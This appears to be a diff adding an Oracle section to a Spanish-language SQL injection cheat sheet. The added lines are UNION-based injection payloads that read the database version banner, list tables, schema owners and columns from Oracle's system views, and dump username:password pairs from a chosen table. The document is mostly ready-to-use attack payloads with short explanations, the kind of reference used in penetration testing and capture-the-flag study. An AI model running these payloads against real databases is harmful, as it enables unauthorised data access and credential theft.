@@ -135,3 +135,31 @@ SELECT username,password FROM users UNION SELECT username,password FROM login.us
 ```SQL
 SELECT username,password FROM users UNION SELECT NULL,username||':'||password FROM users-- -
 ```
+### Oracle
+```SQL
+' UNION SELECT NULL,NULL from dual-- -
+```
+```SQL
+' UNION SELECT NULL,banner from v$version-- -
+```
+- Todas las tablas existentes
+```SQL
+' UNION SELECT NULL,table_name FROM all_tables-- -
+```
++ Usuario que posee un esquema de DB.
+	+  Específico que es el propietario de todos los objetos dentro de ese esquema, como tablas, vistas, índices, procedimientos almacenados, etc.
+```SQL
+' UNION SELECT NULL,owner FROM all_tables-- -
+```
+```SQL
+' UNION SELECT NULL,table_name FROM all_tables WHERE owner=''-- -
+# En caso de especificar uno en concreto.
+```
++ Muestra todas las columnas de una tabla
+```SQL
+' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name=''-- -
+```
++ Ver los datos de cada columna}
+```SQL
+' UNION SELECT NULL,username||':'||password FROM nombre_tabla-- -
+```
